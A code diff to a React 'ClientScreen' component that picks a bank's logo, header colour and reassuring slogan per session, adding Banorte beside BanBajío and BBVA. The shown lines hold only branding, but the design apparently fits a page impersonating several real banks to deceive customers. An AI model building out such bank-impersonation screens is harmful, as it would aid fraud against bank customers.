@@ -10,6 +10,7 @@ import banbajioLogo from '../assets/banbajio_logo_oficial.png';
 import banbajioBackground from '../assets/IMG_0354.jpeg';
 import bbvaLogo from '@assets/bbva_logo.png';
 import bbvaLogoWhite from '../assets/bbva_logo_white.png';
+import banorteLogo from '../assets/banorte-logo.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -139,6 +140,17 @@ export default function ClientScreen() {
           />
         </header>
       );
+    } else if (sessionData.banco === 'BANORTE') {
+      return (
+        <header className="bg-[#d6001c] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <img 
+            src={banorteLogo} 
+            className="h-20 inline-block" 
+            alt="Banorte" 
+          />
+        </header>
+      );
     } else {
       return (
         <header className="bg-[#e10098] text-white p-4 text-center">
@@ -235,6 +247,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-4 px-4">
           <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BANORTE') {
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm text-gray-600">Tu banca en línea, más segura y con mayor protección</p>
         </div>
       );
     } else {
